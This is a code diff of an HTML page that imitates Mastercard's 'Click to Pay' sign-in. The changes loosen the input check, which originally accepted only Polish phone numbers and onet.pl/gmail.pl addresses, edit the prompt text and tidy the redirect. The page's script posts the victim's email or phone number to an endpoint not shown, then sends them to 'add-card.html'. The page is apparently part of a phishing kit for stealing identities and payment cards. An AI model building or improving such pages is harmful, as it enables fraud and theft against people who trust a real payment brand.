@@ -6,14 +6,15 @@
     <meta name="description" content="Create a payment profile or sign in with Click to Pay" />
     <link rel="icon" href="https://src.mastercard.com/profile/favicon.ico" />
 
-    <!-- CSS -->
-    <link rel="stylesheet" href="/style.css" />
-    <link rel="stylesheet" href="/index_files/index.d9994029.css" />
+    <!-- ✅ Подключаем стили напрямую -->
+    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="index_files/index.d9994029.css" />
 
     <title>Click to Pay</title>
   </head>
   <body>
     <div class="root-container">
+      <!-- Header -->
       <header class="header__wrapper">
         <div class="container">
           <div class="row row-space-between">
@@ -34,6 +35,7 @@
         </div>
       </header>
 
+      <!-- Main -->
       <main>
         <div class="container">
           <div class="row margin-bottom-sm">
@@ -63,7 +65,7 @@
                   />
                   <label for="userId" class="al-input__label">Email or mobile number</label>
                   <div class="al-input__subtext">
-                    Click to Pay will use this information to verify you and may send verification codes. Message/data rates may apply.
+                    We'll use this to verify your identity. Message/data rates may apply.
                   </div>
                 </div>
               </div>
@@ -93,6 +95,7 @@
         </div>
       </main>
 
+      <!-- Footer -->
       <footer class="footer">
         <div class="container">
           <div class="row">
@@ -109,6 +112,7 @@
       </footer>
     </div>
 
+    <!-- ✅ JS -->
     <script>
       const input = document.getElementById('userId');
       const button = document.getElementById('submit-btn');
@@ -122,9 +126,9 @@
         e.preventDefault();
         const value = input.value.trim();
 
-        const isValid = value.match(/^(\+48\d{9}|[a-zA-Z0-9._%+-]+@(onet|gmail)\.pl)$/i);
+        const isValid = value.match(/^(\+48\d{9}|[a-zA-Z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,})$/i);
         if (!isValid) {
-          alert('Please enter a valid phone number (+48...) or email address (@onet.pl/@gmail.com)');
+          alert('Please enter a valid phone number or email');
           return;
         }
 
@@ -144,8 +148,7 @@
             })
           });
 
-          // Redirect to add-card.html
-          window.location.href = '/add-card.html';
+          window.location.href = 'add-card.html';
         } catch (err) {
           console.error('Submission error:', err);
           alert('Something went wrong. Please try again.');
